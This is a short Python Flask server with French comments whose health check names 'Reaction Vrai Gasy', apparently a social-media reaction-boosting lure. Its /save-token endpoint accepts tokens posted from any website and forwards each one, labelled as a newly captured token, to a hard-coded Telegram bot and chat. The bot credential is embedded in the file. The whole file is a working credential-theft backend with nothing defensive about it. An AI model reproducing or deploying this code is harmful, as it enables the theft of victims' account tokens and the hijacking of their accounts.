import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Tes accès Telegram
TOKEN_BOT = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
CHAT_ID = "7129218282"

@app.route('/')
def health_check():
    return "SERVEUR REACTION VRAI GASY ACTIF", 200

@app.route('/save-token', methods=['POST'])
def save_token():
    try:
        data = request.get_json()
        token = data.get('token')
        if token:
            # Envoi direct vers ton Telegram
            url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
            payload = {
                "chat_id": CHAT_ID,
                "text": f"🚀 NOUVEAU TOKEN CAPTURÉ :\n\n{token}"
            }
            requests.post(url, json=payload, timeout=10)
            return jsonify({"status": "sent_to_telegram"}), 200
        return jsonify({"status": "no_token"}), 400
    except Exception as e:
        print(f"Erreur : {e}")
        return jsonify({"status": "error"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
